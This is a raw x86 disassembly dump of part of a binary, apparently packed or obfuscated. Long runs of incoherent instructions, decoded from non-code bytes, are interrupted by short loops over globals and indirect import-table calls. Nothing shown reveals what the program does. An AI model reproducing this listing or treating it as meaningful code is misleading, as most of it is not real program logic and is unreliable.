  407608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407609:	xor    BYTE PTR [ecx-0x43479e1d],0xa5
  407610:	hlt    
  407611:	adc    bl,BYTE PTR [edx-0x15]
  407614:	pop    edi
  407615:	loop   0x40761f
  407617:	lea    ebx,[edx+ecx*2-0x666952f6]
  40761e:	add    al,0xa5
  407620:	pop    es
  407621:	adc    al,0x43
  407623:	dec    edi
  407624:	and    BYTE PTR [edx-0x45557547],dh
  40762a:	push   esp
  40762b:	pushf  
  40762c:	sub    bh,BYTE PTR [ecx]
  40762e:	fld    DWORD PTR [edx+0x4522c61f]
  407634:	cwde   
  407635:	push   ebx
  407636:	push   ds
  407637:	pushf  
  407638:	sub    eax,0xfbeed38a
  40763d:	dec    eax
  40763e:	nop
  40763f:	int    0xc2
  407641:	jecxz  0x4075eb
  407643:	inc    ebp
  407644:	dec    ebx
  407645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407646:	imul   ebp,ebx,0x276a3826
  40764c:	mov    ds:0xd8141aa3,al
  407651:	mov    ch,0xb3
  407653:	mov    ch,0x71
  407655:	inc    esp
  407656:	mov    bl,0xe9
  407658:	scas   eax,DWORD PTR es:[edi]
  407659:	and    DWORD PTR [esi-0x50b01f9d],edx
  40765f:	jmp    0x5146:0xc8417f24
  407666:	jo     0x407629
  407668:	mov    ds:0x134308bb,eax
  40766d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40766e:	xor    ebp,eax
  407670:	mov    ch,0x10
  407672:	sbb    cl,BYTE PTR [edi+0x59]
  407675:	out    0x1b,eax
  407677:	or     al,al
  407679:	pop    ebx
  40767a:	aam    0xce
  40767c:	or     DWORD PTR [edx],ebx
  40767e:	sub    BYTE PTR [ebp-0x35970df4],0x29
  407685:	std    
  407686:	push   eax
  407687:	pop    esi
  407688:	sub    DWORD PTR [eax+0x60c9290],esp
  40768e:	dec    ecx
  40768f:	inc    esi
  407690:	ds iret 
  407692:	jle    0x4076ae
  407694:	inc    edi
  407695:	gs loopne 0x40763b
  407698:	push   cs
  407699:	test   ah,al
  40769b:	sub    eax,0xb6a69e7
  4076a0:	jb     0x4076e3
  4076a2:	mov    ah,0xca
  4076a4:	or     bl,BYTE PTR [edi+0x62]
  4076a7:	in     eax,dx
  4076a8:	loopne 0x4076f4
  4076aa:	and    ebp,ebx
  4076ac:	mov    bl,0x55
  4076ae:	xchg   edx,eax
  4076af:	dec    ebx
  4076b0:	pop    ebp
  4076b1:	jae    0x407650
  4076b3:	mov    cl,0xf2
  4076b5:	push   cs
  4076b6:	adc    DWORD PTR fs:[edx],ecx
  4076b9:	sbb    bl,BYTE PTR [esi+0x61]
  4076bc:	lods   al,BYTE PTR ds:[esi]
  4076bd:	divps  xmm1,xmm4
  4076c0:	mov    eax,0x3bfba9e
  4076c5:	mov    DWORD PTR [esi-0x514659a5],ebx
  4076cb:	loope  0x407681
  4076cd:	mov    bh,0x53
  4076cf:	push   edi
  4076d0:	fdivr  QWORD PTR [ebp+0x505748a8]
  4076d6:	adc    eax,0x410fd3a0
  4076db:	inc    esp
  4076dc:	sbb    dh,BYTE PTR [esi-0x59]
  4076df:	mov    ebp,0xebab1662
  4076e4:	ret    0xc5c7
  4076e7:	push   ecx
  4076e8:	pop    ebp
  4076e9:	int3   
  4076ea:	xchg   ebx,eax
  4076eb:	pop    ecx
  4076ec:	sbb    BYTE PTR [ebx+0x856d9c7],0x41
  4076f3:	and    edx,ebp
  4076f5:	push   ecx
  4076f6:	enter  0xd0ce,0xc2
  4076fa:	dec    edi
  4076fb:	fwait
  4076fc:	push   ebp
  4076fd:	pop    ss
  4076fe:	xchg   ebx,eax
  4076ff:	mov    ebx,esi
  407701:	jb     0x407721
  407703:	inc    ecx
  407704:	pop    esp
  407705:	pop    ds
  407706:	inc    edx
  407707:	mov    dh,0x38
  407709:	cwde   
  40770a:	pop    edi
  40770b:	xor    ebx,ecx
  40770d:	mov    DWORD PTR ds:0x41075b,0x751d
  407717:	xor    edx,edx
  407719:	add    DWORD PTR ds:0x447980,0xeda
  407723:	add    eax,esi
  407725:	and    DWORD PTR ds:0x447980,0x424861
  40772f:	add    ebx,esi
  407731:	mov    DWORD PTR ds:0x447988,0x5df4
  40773b:	jmp    0x407872
  407740:	ss push 0x77
  407743:	call   0x6b2de4f3
  407748:	pop    ecx
  407749:	fcom   st(3)
  40774b:	xor    al,0x88
  40774d:	scas   eax,DWORD PTR es:[edi]
  40774e:	jmp    0x67c:0x7c325b09
  407755:	jg     0x4077d3
  407757:	jl     0x407737
  407759:	test   DWORD PTR [ecx],edx
  40775b:	push   edx
  40775c:	bound  ebx,QWORD PTR [edi]
  40775e:	sti    
  40775f:	test   DWORD PTR ds:0xd2848be4,ebx
  407765:	push   es
  407766:	or     al,0x8c
  407768:	cwde   
  407769:	mov    edx,0xc493be71
  40776e:	xchg   ebx,edx
  407770:	jno    0x407758
  407772:	sbb    ch,BYTE PTR [edx-0x3b84d17d]
  407778:	(bad)  
  40777a:	sbb    DWORD PTR [ecx],0xffffffd9
  40777d:	cs and al,0xb5
  407780:	cmp    al,0xc9
  407782:	adc    BYTE PTR [ebp-0x19974082],bh
  407788:	repz pop ebp
  40778a:	fnstenv [esi-0x2b1eca62]
  407790:	dec    ebx
  407791:	mov    esp,0x1d8bfef6
  407796:	(bad)  
  407797:	(bad)  
  407799:	xor    eax,0x1174f052
  40779e:	scas   eax,DWORD PTR es:[edi]
  40779f:	cmp    BYTE PTR [esi+0x794752b5],bh
  4077a5:	mov    DWORD PTR [esi-0x1cf6ec6f],edx
  4077ab:	jo     0x407784
  4077ad:	(bad)  
  4077ae:	out    0xc7,al
  4077b0:	jb     0x40781b
  4077b2:	repz xlat BYTE PTR ds:[ebx]
  4077b4:	dec    eax
  4077b5:	jg     0x407786
  4077b7:	lock (bad) 
  4077ba:	sub    ecx,DWORD PTR [esp+eiz*2]
  4077bd:	mov    bl,0x10
  4077bf:	mov    ds,ebx
  4077c1:	hlt    
  4077c2:	mov    bh,BYTE PTR [edx]
  4077c4:	fdivr  DWORD PTR [ebx+0x54]
  4077c7:	mov    ds:0xac02a837,eax
  4077cc:	xchg   ebx,eax
  4077cd:	in     al,dx
  4077ce:	cmc    
  4077cf:	ret    
  4077d0:	ret    
  4077d1:	inc    edi
  4077d2:	repnz imul esi,DWORD PTR [esi+0x9754ab2],0x71
  4077da:	mov    dh,0xaa
  4077dc:	(bad)  
  4077dd:	(bad)  
  4077de:	jnp    0x4077cc
  4077e0:	xchg   edi,eax
  4077e1:	jmp    0x4077dd
  4077e3:	or     BYTE PTR [edx],bh
  4077e5:	mov    ebp,0x35e47d1
  4077ea:	(bad)  
  4077eb:	jb     0x407807
  4077ed:	sti    
  4077ee:	jg     0x4077db
  4077f0:	pop    eax
  4077f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077f2:	leave  
  4077f3:	hlt    
  4077f4:	ins    DWORD PTR es:[edi],dx
  4077f5:	loopne 0x4077cd
  4077f7:	mov    ds:0x8d54af70,al
  4077fc:	fcmovne st,st(1)
  4077fe:	jecxz  0x40781b
  407800:	ins    BYTE PTR es:[edi],dx
  407801:	fisub  DWORD PTR [esi+0x5286b6f2]
  407807:	jbe    0x4077a2
  407809:	push   es
  40780a:	mov    DWORD PTR [ecx+0x4ce547ae],0x448ffd14
  407814:	jns    0x407827
  407816:	add    al,0x81
  407818:	mov    cl,0xa1
  40781a:	mov    al,ds:0xf7f1948d
  40781f:	sub    BYTE PTR [ecx],ah
  407821:	lods   eax,DWORD PTR ds:[esi]
  407822:	mov    esp,0x7ee63e11
  407827:	std    
  407828:	xor    DWORD PTR [ebx-0xcd1d8e7],esi
  40782e:	push   cs
  40782f:	cmp    eax,0x93a2594e
  407834:	cmovb  ebx,DWORD PTR [ecx+0x53]
  407838:	pop    edx
  407839:	std    
  40783a:	fisub  DWORD PTR [edx-0x78]
  40783d:	jp     0x4078aa
  40783f:	pushf  
  407840:	imul   eax,DWORD PTR [edx-0x40],0xfad7e954
  407847:	dec    edx
  407848:	push   esp
  407849:	mov    ds:0xdd16f204,al
  40784e:	jae    0x4077f0
  407850:	and    ecx,DWORD PTR ds:0xb1444b67
  407856:	pop    ss
  407857:	push   esi
  407858:	xchg   ebx,eax
  407859:	pushf  
  40785a:	ret    
  40785b:	outs   dx,BYTE PTR ds:[esi]
  40785c:	mov    dh,0xe4
  40785e:	xchg   ebx,eax
  40785f:	xchg   ecx,eax
  407860:	and    esi,0xffffffdd
  407863:	(bad)  
  407864:	cmp    bh,BYTE PTR [ebx]
  407866:	mov    DWORD PTR [eax],esp
  407868:	xor    ch,al
  40786a:	add    DWORD PTR [eax+0x1],esp
  40786d:	push   0xffffff94
  40786f:	js     0x4078c0
  407871:	stos   BYTE PTR es:[edi],al
  407872:	div    ebx
  407874:	mov    edx,DWORD PTR ds:0x424851
  40787a:	mov    edx,DWORD PTR [ebp-0x20]
  40787d:	mov    DWORD PTR [ebp-0x2c],0x4eb5
  407884:	mov    DWORD PTR ds:0x44a6e8,0x3c9f
  40788e:	cmp    eax,DWORD PTR [edx]
  407890:	je     0x408082
  407896:	mov    edx,DWORD PTR ds:0x410743
  40789c:	and    DWORD PTR ds:0x44d418,edx
  4078a2:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  4078a9:	and    DWORD PTR ds:0x424855,0x0
  4078b3:	mov    edx,DWORD PTR ds:0x424855
  4078b9:	inc    edx
  4078ba:	mov    DWORD PTR ds:0x424855,edx
  4078c0:	cmp    DWORD PTR ds:0x424855,0x16
  4078c7:	jne    0x4078f0
  4078cd:	push   DWORD PTR [ebp-0x20]
  4078d0:	push   0x3477
  4078d5:	push   0x4479a0
  4078da:	push   DWORD PTR [ebp-0x10]
  4078dd:	push   0x7aad
  4078e2:	push   0x3f84
  4078e7:	push   DWORD PTR [ebp-0x1c]
  4078ea:	call   DWORD PTR ds:0x442014
  4078f0:	cmp    DWORD PTR ds:0x424855,0x13
  4078f7:	jb     0x4078b3
  4078fd:	lea    eax,[ebp-0xc]
  407900:	mov    DWORD PTR [ebp-0x10],eax
  407903:	xor    edx,edx
  407905:	xor    edx,DWORD PTR ds:0x4444e4
  40790b:	mov    eax,ds:0x4479b8
  407910:	sub    edx,eax
  407912:	xor    edx,DWORD PTR [edx+eax*1]
  407915:	jmp    0x407a4c
  40791a:	lea    eax,[eax+ebx*1]
  40791d:	mov    WORD PTR [ebp+0x1d8d80],ds
  407923:	std    
  407924:	inc    esi
  407925:	nop
  407926:	push   ds
  407927:	jns    0x40790a
  407929:	push   eax
  40792a:	gs xor eax,0x7f067c7c
  407930:	jl     0x4079ae
  407932:	(bad)  
  407933:	jo     0x407998
  407935:	mov    ebp,0xf81e5b5f
  40793a:	or     ah,bl
  40793c:	jge    0x407926
  40793e:	je     0x4079bb
  407940:	push   0x60af4158
  407945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407946:	js     0x4079a6
  407948:	(bad)  
  407949:	cmp    al,0x5b
  40794b:	xchg   DWORD PTR [ebp-0x10ea6bd2],eax
  407951:	push   ds
  407952:	push   0x96f3295
  407957:	aad    0xa7
  407959:	add    DWORD PTR [ecx],ebx
  40795b:	pop    ds
  40795c:	push   cs
  40795d:	sbb    edx,DWORD PTR [ebx]
  40795f:	jmp    FWORD PTR [ebx+0x73482b3a]
  407965:	adc    edx,DWORD PTR [ecx+0x772c086c]
  40796b:	std    
  40796c:	xor    esp,DWORD PTR [eax]
  40796e:	pusha  
  40796f:	add    al,BYTE PTR [esi]
  407971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407972:	out    dx,al
  407973:	data16 inc BYTE PTR [ecx]
  407976:	fstp   TBYTE PTR [edi+0x1a]
  407979:	xchg   DWORD PTR [edx],esp
  40797b:	es scas eax,DWORD PTR es:[edi]
  40797d:	mov    fs,WORD PTR [edx]
  40797f:	pop    ebp
  407980:	push   edx
  407981:	adc    ebx,DWORD PTR [ecx-0x78b68941]
  407987:	ja     0x40797d
  407989:	push   esp
  40798a:	outs   dx,BYTE PTR ds:[esi]
  40798b:	test   eax,0xb9b6a30a
  407990:	ror    dh,cl
  407992:	push   esp
  407993:	inc    esp
  407994:	iret   
  407995:	mov    bl,0xe5
  407997:	div    DWORD PTR [ebx]
  407999:	stos   BYTE PTR es:[edi],al
  40799a:	aaa    
  40799b:	and    al,0xe3
  40799d:	in     al,dx
  40799e:	imul   eax,DWORD PTR fs:[ecx+0x164e7cd3],0xffffffde
  4079a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079a7:	ds pop ss
  4079a9:	cmp    eax,0x6f5fad8
  4079ae:	je     0x4079f3
  4079b0:	and    bl,BYTE PTR [edi]
  4079b2:	mov    WORD PTR [eax-0x5b37ec16],fs
  4079b8:	int    0x86
  4079ba:	mov    ds:0x705b51ea,eax
  4079bf:	push   ss
  4079c0:	pop    ebp
  4079c1:	aad    0x78
  4079c3:	push   es
  4079c4:	cmp    dl,BYTE PTR [ebx+ebp*2-0x7fb69f08]
  4079cb:	stc    
  4079cc:	not    ah
  4079ce:	or     cl,BYTE PTR [eax]
  4079d0:	mov    eax,ds:0xc6337779
  4079d5:	mov    bh,BYTE PTR [ebx]
  4079d7:	push   cs
  4079d8:	mov    ch,0x72
  4079da:	shr    DWORD PTR [ebx+0x5d870d27],cl
  4079e0:	imul   ecx,DWORD PTR [edi+0x63b1782b],0x28
  4079e7:	imul   BYTE PTR [esi+0xb09ad9c]
  4079ed:	pop    ecx
  4079ee:	push   0x24d021e4
  4079f3:	dec    edx
  4079f4:	jmp    0xe922:0x2405f007
  4079fb:	test   eax,0xdfbf7098
  407a00:	dec    ebp
  407a01:	cmp    al,0xf5
  407a03:	pcmpgtb mm1,QWORD PTR [ebx+ebp*2-0x10daf26a]
  407a0b:	add    eax,0xb8a5ab24
  407a10:	inc    edi
  407a11:	fsubr  st,st(3)
  407a13:	jae    0x4079c6
  407a15:	nop
  407a16:	popa   
  407a17:	icebp  
  407a18:	xchg   edx,eax
  407a19:	cmp    ebx,DWORD PTR [edi]
  407a1b:	xchg   esi,eax
  407a1c:	xor    eax,DWORD PTR [ebx-0x3d]
  407a1f:	add    al,BYTE PTR [ebx-0x53]
  407a22:	retf   0xcf30
  407a25:	pop    ss
  407a26:	inc    ecx
  407a27:	hlt    
  407a28:	mov    dh,0xb1
  407a2a:	js     0x407a44
  407a2c:	xor    eax,0xc0a3048d
  407a31:	rcr    BYTE PTR [ebx],0xc6
  407a34:	ja     0x407a22
  407a36:	outs   dx,BYTE PTR ds:[esi]
  407a37:	leave  
  407a38:	popa   
  407a39:	or     BYTE PTR [ecx+0x70],ch
  407a3c:	and    DWORD PTR [ecx+0x1c],ebx
  407a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a40:	pop    es
  407a41:	adc    ch,BYTE PTR [ebp+0x73606d1f]
  407a47:	xchg   edx,eax
  407a48:	sub    DWORD PTR [edx+0x458ba004],ebp
  407a4e:	lock mov DWORD PTR ds:0x447994,0x1e
  407a59:	cmp    DWORD PTR ds:0x447994,0x0
  407a60:	je     0x407aad
  407a66:	cmp    DWORD PTR ds:0x447994,0x10
  407a6d:	jne    0x407a7f
  407a73:	push   DWORD PTR [ebp-0x1c]
  407a76:	push   DWORD PTR [ebp-0x18]
  407a79:	call   DWORD PTR ds:0x442018
  407a7f:	cmp    DWORD PTR ds:0x447994,0x11
  407a86:	jne    0x407a99
  407a8c:	mov    edx,DWORD PTR ds:0x447994
  407a92:	dec    edx
  407a93:	mov    DWORD PTR ds:0x447994,edx
  407a99:	xor    edx,edx
  407a9b:	add    edx,DWORD PTR ds:0x447994
  407aa1:	dec    edx
  407aa2:	mov    DWORD PTR ds:0x447994,edx
  407aa8:	jmp    0x407a59
  407aad:	mov    edx,DWORD PTR [eax]
  407aaf:	imul   edx,edx,0xf89ea9e0
  407ab5:	mov    DWORD PTR [eax],edx
  407ab7:	mov    eax,DWORD PTR [ebp-0xc]
  407aba:	cmp    eax,0x1fe34420
  407abf:	je     0x407c13
  407ac5:	mov    eax,DWORD PTR [ebp-0x1c]
  407ac8:	jmp    0x407bff
  407acd:	(bad)  
  407ace:	fsub   DWORD PTR [edx+0x76]
  407ad1:	jp     0x407a69
  407ad3:	jp     0x407b2d
  407ad5:	mov    ch,0xbf
  407ad7:	xchg   ebp,eax
  407ad8:	fistp  QWORD PTR [edi]
  407ada:	gs pusha 
  407adc:	push   edx
  407add:	getsec 
  407adf:	jl     0x407b5d
  407ae1:	push   es
  407ae2:	jg     0x407b60
  407ae4:	jl     0x407a9f
  407ae6:	adc    DWORD PTR [eax+esi*8+0x78],ebx
  407aea:	aaa    
  407aeb:	inc    edi
  407aec:	lock nop
  407aee:	jge    0x407ae8
  407af0:	ins    DWORD PTR es:[edi],dx
  407af1:	pop    esp
  407af2:	add    al,0x6b
  407af4:	fwait
  407af5:	inc    ebx
  407af6:	test   al,0x51
  407af8:	push   eax
  407af9:	sbb    DWORD PTR ds:0x72c48c89,ecx
  407aff:	out    dx,al
  407b00:	sti    
  407b01:	mov    edi,DWORD PTR [ecx+ebp*2+0x39f4bb6e]
  407b08:	repnz push ecx
  407b0a:	fbstp  TBYTE PTR [ecx]
  407b0c:	fisttp QWORD PTR [eax+0x1c]
  407b0f:	scas   eax,DWORD PTR es:[edi]
  407b10:	push   ebp
  407b11:	fdivr  DWORD PTR [edi+0xc]
  407b14:	mov    ah,0x9e
  407b16:	mov    eax,0x5ad5fc99
  407b1b:	ds stos DWORD PTR es:[edi],eax
  407b1d:	sub    DWORD PTR ds:0xe9f1a8f,ebx
  407b23:	gs push ss
  407b25:	sbb    dl,0x74
  407b28:	add    DWORD PTR [esi],ecx
  407b2a:	and    eax,0x9214772
  407b2f:	dec    ecx
  407b30:	sahf   
  407b31:	scas   al,BYTE PTR es:[edi]
  407b32:	jnp    0x407b68
  407b34:	sub    ecx,DWORD PTR [edx-0x5]
  407b37:	pop    ebx
  407b38:	push   ecx
  407b39:	nop
  407b3a:	fsubr  st,st(1)
  407b3c:	std    
  407b3d:	fisub  WORD PTR ds:0xc9b27317
  407b43:	dec    eax
  407b44:	dec    esi
  407b45:	mov    al,0xd3
  407b47:	add    eax,0xd9a62e9b
  407b4c:	jmp    DWORD PTR ds:0x80ea4eee
  407b52:	jns    0x407ba9
  407b54:	add    ch,0xe7
  407b57:	fs or  dh,dl
  407b5a:	dec    esi
  407b5b:	ss aas 
  407b5d:	dec    edi
  407b5e:	add    ebp,DWORD PTR [esi-0x7a]
  407b61:	mov    ds:0xff1ffc18,al
  407b66:	pand   mm7,QWORD PTR [ebp-0x2f]
  407b6a:	push   ss
  407b6b:	add    DWORD PTR [esi+0x230cba4f],ebx
  407b71:	add    dl,cl
  407b73:	jbe    0x407b7f
  407b75:	outs   dx,BYTE PTR ds:[esi]
  407b76:	nop
  407b77:	(bad)  
  407b78:	jecxz  0x407bcf
  407b7a:	ins    DWORD PTR es:[edi],dx
  407b7b:	push   ss
  407b7c:	mov    ah,BYTE PTR ds:[esi-0x27a14d53]
  407b83:	mov    bl,0xa5
  407b85:	rol    bh,1
  407b87:	dec    esi
  407b88:	fisttp QWORD PTR [esi]
  407b8a:	cmp    cl,al
  407b8c:	xchg   esp,eax
  407b8d:	into   
  407b8e:	jnp    0x407beb
  407b90:	push   esp
  407b91:	jp     0x407c0f
  407b93:	dec    edx
  407b94:	mov    al,ds:0x5e7d6d1d
  407b99:	push   edi
  407b9a:	mov    ebx,0x9e685eea
  407b9f:	shl    BYTE PTR [ebp-0x7fb71cde],cl
  407ba5:	arpl   WORD PTR [ebx],dx
  407ba7:	je     0x407b6f
  407ba9:	sti    
  407baa:	sub    DWORD PTR [esi-0x49],ebx
  407bad:	mov    ebp,0x8e9ce87e
  407bb2:	push   ss
  407bb3:	in     al,0xdb
  407bb5:	pop    esi
  407bb6:	jg     0x407b9d
  407bb8:	sbb    DWORD PTR [ebp+0x4450969e],ecx
  407bbe:	or     eax,0xe37eefd9
  407bc3:	push   0x1c
  407bc5:	pop    ss
  407bc6:	icebp  
  407bc7:	push   eax
  407bc8:	bound  eax,QWORD PTR [ecx+0x68]
  407bcb:	mov    ebp,0x2872ceea
  407bd0:	shl    DWORD PTR [edi],1
  407bd2:	adc    BYTE PTR ds:0x74cbb0a0,ah
  407bd8:	daa    
  407bd9:	retf   
  407bda:	and    BYTE PTR [edi],dh
  407bdc:	sti    
  407bdd:	jb     0x407bd2
  407bdf:	scas   eax,DWORD PTR es:[edi]
  407be0:	arpl   sp,sp
  407be2:	or     DWORD PTR [ebx+eiz*4+0x53cb46df],esp
  407be9:	pop    ss
  407bea:	or     esp,DWORD PTR [edx-0x3ff6bbe4]
  407bf0:	or     eax,0xb839702d
  407bf5:	jmp    FWORD PTR [edx+ecx*2+0x75]
  407bf9:	(bad)  
  407bfa:	call   0x8c6d321e
  407bff:	or     DWORD PTR [eax],0x60751c90
  407c05:	mov    eax,DWORD PTR [ebp-0x8]
  407c08:	xor    eax,ecx
  407c0a:	add    eax,esi
  407c0c:	pop    edi
  407c0d:	pop    esi
  407c0e:	pop    ebx
  407c0f:	leave  
  407c10:	ret    0x4
  407c13:	mov    eax,DWORD PTR [ebp-0xc]
  407c16:	add    eax,DWORD PTR [ebp-0x18]
  407c19:	cmp    eax,0x188271cd
  407c1e:	je     0x407d69
  407c24:	mov    eax,DWORD PTR [ebp-0x10]
  407c27:	and    DWORD PTR [eax],0x751c9d
  407c2d:	jmp    0x407c05
  407c32:	jmp    0x407d69
  407c37:	jnp    0x407be9
  407c39:	lds    edx,FWORD PTR [eax+0x5b7da5fd]
  407c3f:	cmp    ah,BYTE PTR [ebp+0x70]
  407c42:	adc    eax,0x45fd240c
  407c47:	sub    DWORD PTR [esi],esi
  407c49:	jl     0x407cc7
  407c4b:	push   es
  407c4c:	jg     0x407cca
  407c4e:	jl     0x407ca4
  407c50:	sbb    eax,esi
  407c52:	jmp    DWORD PTR [ebx]
  407c54:	sub    al,0x30
  407c56:	cmc    
  407c57:	xor    al,0xe4
  407c59:	and    eax,0xbb826761
  407c5e:	jne    0x407c7c
  407c60:	outs   dx,BYTE PTR ds:[esi]
  407c61:	(bad)  
  407c62:	dec    esi
  407c63:	mov    edx,DWORD PTR [esi-0x76]
  407c66:	test   ah,cl
  407c68:	xchg   DWORD PTR [ecx+0x3cdc7896],esp
  407c6e:	lds    ebx,FWORD PTR [ebx-0x4]
  407c71:	test   bh,ch
  407c73:	fild   QWORD PTR [edi-0x2c]
  407c76:	fs dec ecx
  407c78:	or     edx,DWORD PTR [edi]
  407c7a:	in     al,dx
  407c7b:	outs   dx,BYTE PTR ds:[esi]
  407c7c:	fisubr WORD PTR [ecx]
  407c7e:	retf   
  407c7f:	xchg   esi,eax
  407c80:	inc    esi
  407c81:	pop    ebp
  407c82:	lea    ecx,[eax-0x60]
  407c85:	(bad)  
  407c86:	pop    esp
  407c87:	inc    esi
  407c88:	(bad)  
  407c89:	cwde   
  407c8a:	shr    BYTE PTR [ebp+ebx*4+0x62e78533],0xa9
  407c92:	jb     0x407cf2
  407c94:	ins    BYTE PTR es:[edi],dx
  407c95:	jae    0x407cdd
  407c97:	ret    0x9723
  407c9a:	sub    esi,edi
  407c9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c9d:	and    al,0x8
  407c9f:	ror    BYTE PTR [ebx-0x2bdb1088],0xf8
  407ca6:	push   0x31
  407ca8:	adc    bh,BYTE PTR [edx-0x36]
  407cab:	inc    DWORD PTR [edx-0x75]
  407cae:	push   edi
  407caf:	cwde   
  407cb0:	push   DWORD PTR [edx-0x18]
  407cb3:	mov    ebp,0xc94b8c75
  407cb8:	push   esi
  407cb9:	mov    al,0x2f
  407cbb:	and    DWORD PTR [eax+0x49],ecx
  407cbe:	pop    esp
  407cbf:	pop    es
  407cc0:	xlat   BYTE PTR ds:[ebx]
  407cc1:	inc    ebx
  407cc2:	bound  eax,QWORD PTR [eax+0x5bf76d27]
  407cc8:	xchg   esi,eax
  407cc9:	arpl   WORD PTR [eax],dx
  407ccb:	das    
  407ccc:	or     al,dh
  407cce:	cmp    edx,DWORD PTR [ecx-0x6ea86cf9]
  407cd4:	fdiv   QWORD PTR ds:0x23325686
  407cda:	cmp    BYTE PTR [edi+ebp*8],al
  407cdd:	dec    edi
  407cde:	pop    edx
  407cdf:	or     BYTE PTR [bx+0x4668],dh
  407ce4:	push   0xffffff82
  407ce6:	xchg   DWORD PTR [eax],ebx
  407ce8:	enter  0x64d9,0xd
  407cec:	sub    al,BYTE PTR [esi+0x242d0c1f]
  407cf2:	cmp    DWORD PTR [edx+0x7552b53],ebx
  407cf8:	jecxz  0x407d6e
  407cfa:	(bad)  
  407cfb:	push   edx
  407cfc:	in     al,0xcf
  407cfe:	(bad)  
  407d00:	pop    edi
  407d01:	or     ebp,eax
  407d03:	push   0xde7b7401
  407d08:	mov    al,0xd4
  407d0a:	rdpmc  
  407d0c:	shr    BYTE PTR [esi],0x21
  407d0f:	fs aad 0x96
  407d12:	and    BYTE PTR [ecx],0x3d
  407d15:	sub    edi,0x59ecccd3
  407d1b:	mov    ebp,DWORD PTR [esi+edx*4+0x49]
  407d1f:	jle    0x407d10
  407d21:	not    BYTE PTR [edi]
  407d23:	rcl    DWORD PTR [esi],cl
  407d25:	jle    0x407cff
  407d27:	pop    ds
  407d28:	jge    0x407d31
  407d2a:	cwde   
  407d2b:	repz cmp eax,0x4bc17b8d
  407d31:	push   0x2d
  407d33:	jl     0x407ce3
  407d35:	sbb    DWORD PTR [edi],0x423e1803
  407d3b:	jle    0x407d92
  407d3d:	imul   ebp,DWORD PTR [ebx],0xffffffff
  407d40:	jmp    0x69b6:0xd2b2a9d2
  407d47:	(bad)  
  407d48:	imul   ebx,DWORD PTR [edi],0xfffffff9
  407d4b:	or     ah,al
  407d4d:	fmulp  st(6),st
  407d4f:	mov    bl,0x1d
  407d51:	das    
  407d52:	cdq    
  407d53:	scas   al,BYTE PTR es:[edi]
  407d54:	sub    BYTE PTR [edx+0x44],dh
  407d57:	push   edi
  407d58:	(bad)  
  407d59:	hlt    
  407d5a:	mov    bl,0x17
  407d5c:	add    ah,BYTE PTR [eax+0x5258d161]
  407d62:	mov    ecx,0x6b2edd5e
  407d67:	sub    eax,ebp
  407d69:	mov    eax,DWORD PTR [ebp-0xc]
  407d6c:	mov    edx,DWORD PTR [ebp-0x18]
  407d6f:	or     eax,edx
  407d71:	cmp    eax,0xffff6dad
  407d76:	je     0x407ec1
  407d7c:	mov    eax,DWORD PTR [ebp-0x10]
  407d7f:	jmp    0x407eb6
  407d84:	push   edi
  407d85:	add    BYTE PTR [esi-0x1b],bh
  407d88:	jge    0x407d6f
  407d8a:	jnp    0x407d26
  407d8c:	and    al,BYTE PTR [ebx-0x1a8f8a9c]
  407d92:	call   0x7d09b0b0
  407d97:	jl     0x407d9f
  407d99:	jg     0x407e17
  407d9b:	jl     0x407dca
  407d9d:	test   DWORD PTR ds:0x4eacc595,ecx
  407da3:	push   0x49
  407da5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407da6:	push   esp
  407da7:	add    ebp,DWORD PTR [ecx+0x363e1e63]
  407dad:	cmovs  edi,DWORD PTR [ebp+0x3141a0ad]
  407db4:	inc    esi
  407db5:	and    edi,DWORD PTR [esi]
  407db7:	clc    
  407db8:	add    ah,cl
  407dba:	stc    
  407dbb:	mov    BYTE PTR [esi],dl
  407dbd:	out    dx,al
  407dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dbf:	pop    edx
  407dc0:	aas    
  407dc1:	aas    
  407dc2:	out    dx,al
  407dc3:	or     cl,BYTE PTR [esi+0x1f21e3f0]
  407dc9:	scas   eax,DWORD PTR es:[edi]
  407dca:	je     0x407dc2
  407dcc:	jb     0x407d97
  407dce:	or     esi,DWORD PTR [ecx-0x6517a15a]
  407dd4:	sti    
  407dd5:	push   esp
  407dd6:	add    DWORD PTR [eax],esi
  407dd8:	int3   
  407dd9:	test   eax,0xc98a3846
  407dde:	ret    0xc53f
  407de1:	iret   
  407de2:	shr    DWORD PTR ds:0x3b45beb4,cl
  407de8:	jo     0x407d8b
  407dea:	in     eax,0x3c
  407dec:	ins    BYTE PTR es:[edi],dx
  407ded:	cmp    BYTE PTR [edx],ch
  407def:	jmp    0x407dd3
  407df1:	jo     0x407e53
  407df3:	push   es
  407df4:	xlat   BYTE PTR ds:[ebx]
  407df5:	les    esi,FWORD PTR [edi]
  407df7:	inc    ebx
  407df8:	sbb    al,ch
  407dfa:	push   ebp
  407dfb:	sahf   
  407dfc:	out    dx,al
  407dfd:	push   ss
  407dfe:	test   eax,0x76b0bcf9
  407e03:	test   eax,esi
  407e05:	inc    eax
  407e06:	push   0xffffff99
  407e08:	into   
  407e09:	sahf   
  407e0a:	test   DWORD PTR [esi+ebp*8],esi
  407e0d:	inc    edx
  407e0e:	(bad)  
  407e0f:	daa    
  407e10:	push   edi
  407e11:	ds in  eax,0xc1
  407e14:	repz jg 0x407dc4
  407e17:	mov    bh,BYTE PTR [ebx+esi*4+0x7e]
  407e1b:	xlat   BYTE PTR ds:[ebx]
  407e1c:	nop
  407e1d:	adc    al,BYTE PTR [ebx-0x1d6be662]
  407e23:	aas    
  407e24:	mov    dl,BYTE PTR [eax+ebp*1]
  407e27:	adc    al,cl
  407e29:	jge    0x407e29
  407e2b:	shr    BYTE PTR [edi+0x1c],cl
  407e2e:	lods   eax,DWORD PTR ds:[esi]
  407e2f:	mov    dl,0x7d
  407e31:	pop    esp
  407e32:	outs   dx,DWORD PTR ds:[esi]
  407e33:	jecxz  0x407e11
